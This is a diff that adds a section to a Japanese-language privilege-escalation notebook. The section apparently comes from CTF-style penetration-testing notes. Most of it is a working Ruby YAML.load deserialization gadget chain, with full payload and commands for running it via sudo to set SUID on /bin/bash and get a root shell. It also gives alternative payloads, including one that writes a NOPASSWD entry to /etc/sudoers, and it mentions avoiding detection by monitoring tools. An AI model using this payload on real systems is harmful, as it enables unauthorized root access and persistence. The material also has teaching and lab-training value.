@@ -230,8 +230,153 @@ sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
 
 ---
 
+---
+
+## パターン5: スクリプトが YAML.load / pickle.load 等でユーザー書き込み可能なファイルを読み込む場合
+
+### 着火条件
+
+`sudo -l` の出力に以下のようなエントリがある場合：
+
+```
+(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+(root) NOPASSWD: /usr/bin/python3 /opt/restore.py
+```
+
+スクリプトを `cat` で確認した際に以下のいずれかが見つかる場合：
+- `YAML.load(File.read(...))` — Ruby の安全でない YAML 読み込み
+- `pickle.load(open(...))` — Python のオブジェクトデシリアライゼーション
+- 読み込み先ファイルが**現ユーザーが書き込めるパスにある**（例: カレントディレクトリ、`/home/[USER]/`）
+
+### 観点・着眼点
+
+**「何が出たら次に何をするか」：**
+
+| スクリプトの中身 | 意味 | 次のアクション |
+|----------------|------|-------------|
+| `YAML.load(File.read("dependencies.yml"))` （相対パス） | カレントディレクトリのファイルを読む。書き込み可能ディレクトリで sudo を実行すれば任意YAMLを読ませられる | 自分が書けるディレクトリに移動 → 悪意ある `dependencies.yml` を作成 → sudo 実行 |
+| `YAML.load(File.read("/home/henry/deps.yml"))` （絶対パス かつ 自分のホームディレクトリ） | ホームディレクトリは通常書き込み可能 | 同上 |
+| `YAML.safe_load(...)` | 安全なロード。任意オブジェクトのデシリアライズは不可 | このパターンは使えない。スクリプトの他の箇所を確認 |
+| `pickle.load(open("backup.pkl", "rb"))` | Python の pickle デシリアライゼーション。任意コード実行可能 | pickle ファイルを偽装して配置 |
+
+**YAML.load の危険性：** Ruby の `YAML.load` (Psych ライブラリ) は `!ruby/object:ClassName` タグを使うことで**任意の Ruby オブジェクトをインスタンス化**できる。これを連鎖させる（Gadget Chain）ことで、最終的に `Kernel#system` を呼ばせられる。
+
+> 原理（なぜ YAML.load でコードが実行されるか・Gadget Chain の動作ステップ） → `../06_Concepts/YAML_Deserialization.md`
+
+### 手順
+
+#### Step 1: スクリプトの内容と読み込みパスを確認
+
+```bash
+# [Target] sudo で実行されるスクリプトを確認
+cat /opt/update_dependencies.rb
+```
+
+確認ポイント：
+- `YAML.load` と `YAML.safe_load` のどちらを使っているか
+- 読み込むファイルのパスが相対パス（`"dependencies.yml"`）か絶対パスか
+- 絶対パスの場合、そのファイルが自分のホームディレクトリなど書き込み可能な場所にあるか
+
+#### Step 2: 悪意ある YAML ファイルを書き込み可能なディレクトリに作成
+
+**事前準備（必須）：** スクリプトを実行するディレクトリ（相対パスの場合はカレントディレクトリが読み込み先になる）に `dependencies.yml` を配置する。
+
+```bash
+# [Target] ファイルを書き込み可能なディレクトリに移動
+cd /home/henry
+
+# cat << 'EOF' > で YAML ファイルを作成
+# ポイント: 'EOF' をシングルクォートで囲むと、ヒアドキュメント内の
+#   !や$等の特殊文字がシェルに解釈されない（バックスラッシュエスケープ不要）
+cat << 'EOF' > dependencies.yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: x
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/object:Gem::Installer
+                     i: x
+                 method_id: :system
+             git_set: "chmod +s /bin/bash"
+         method_id: :resolve
+EOF
+```
+
+**`git_set:` の値が実行されるコマンド。** `chmod +s /bin/bash` の代わりに以下も使える：
+```
+git_set: "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
+git_set: "echo 'henry ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+```
+
+#### Step 3: sudo でスクリプトを実行
+
+```bash
+# [Target] sudo 実行（エラーが出ても途中でコマンドが走る）
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+# エラー例: undefined method `map' for nil:NilClass (NoMethodError)
+# → エラーが出ても SUID が設定されていることがある
+```
+
+#### Step 4: SUID が設定されたことを確認してシェルを取得
+
+```bash
+# [Target] SUID が設定されているか確認
+ls -la /bin/bash
+# -rwsr-sr-x 1 root root ... /bin/bash  ← s が付いていれば成功
+
+# bash -p で EUID=root として実行（-p は実効 UID を落とさずに起動するオプション）
+/bin/bash -p
+
+# 確認
+id
+# uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root)
+```
+
+#### Step 5（原状回復）
+
+```bash
+# SUID を元に戻す（本番環境・実環境では必須）
+chmod -s /bin/bash
+
+# 作成した YAML ファイルを削除
+rm /home/henry/dependencies.yml
+```
+
+### 刺さらなかったとき
+
+- `YAML.safe_load` が使われている → このガジェットチェーンは使えない。スクリプトの他の脆弱性（外部コマンドの PATH ハイジャック等）を探す
+- エラーなしで正常終了するが SUID が設定されない → YAML の構造が崩れている。インデントが 2 スペース単位であることを確認する（YAML はインデント厳格）
+- `ruby 3.1` 以降 → Psych 4.0 に更新されデフォルトで `safe_load` 相当になっているため、このガジェットチェーンは動作しない（`YAML.unsafe_load` に明示変更しない限り）
+- `cat << 'EOF' >` でファイルを作ってもインデントが崩れる → `printf` / `python3 -c "print(...)"` / `vi` 等で直接作成する
+
+### 注意点・落とし穴
+
+- **YAML のインデントは 2 スペース厳守。** タブ文字が混入するとパース失敗。`cat -A dependencies.yml` で `^I`（タブ）がないことを確認する
+- `cat << 'EOF' >` はシングルクォート付き `'EOF'` であることが重要。ダブルクォート `"EOF"` や引用符なし `EOF` だとヒアドキュメント内の `!` や `$` がシェルに解釈される
+- `chmod +s /bin/bash` 後に bash を通常実行（`/bin/bash`）すると SUID が落とされる。必ず `-p` オプションを付ける
+- sudo 実行後にエラーが出ても、YAML の途中まで処理されてコマンドが走っていることがある。エラーを見て諦めず `ls -la /bin/bash` で確認する
+- **原状回復必須：** `chmod -s /bin/bash` で SUID を必ず元に戻す。実環境で SUID を残したままにすると、後からシステムを監視しているツールに検知される
+
+### 関連技術
+- 前：sudo -l でスクリプトパスを発見 → このファイルの観点・着眼点（パターン全体）
+- 後：bash -p での root シェル取得 → `Enumeration_Checklist.md`（侵入後列挙）
+- YAML.load が任意コード実行できる原理 → `../06_Concepts/YAML_Deserialization.md`
+- `.bundle/config` 等からの認証情報取得（横移動に必要） → `../02_Initial_Access/Credential_Discovery.md`
+
+---
+
 ## 関連技術
-- GTFOBins: https://gtfobins.github.io/
-- その他の昇格手法 → `Capabilities.md`, `SUID_SGID.md`
+- 前：GTFOBins: https://gtfobins.github.io/
+- 後：その他の昇格手法 → `Capabilities.md`, `SUID_SGID.md`
 - パストラバーサルでコンテナIDを特定 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
 - Docker 分離の原理（なぜ効くか） → `../06_Concepts/Docker_Isolation.md`
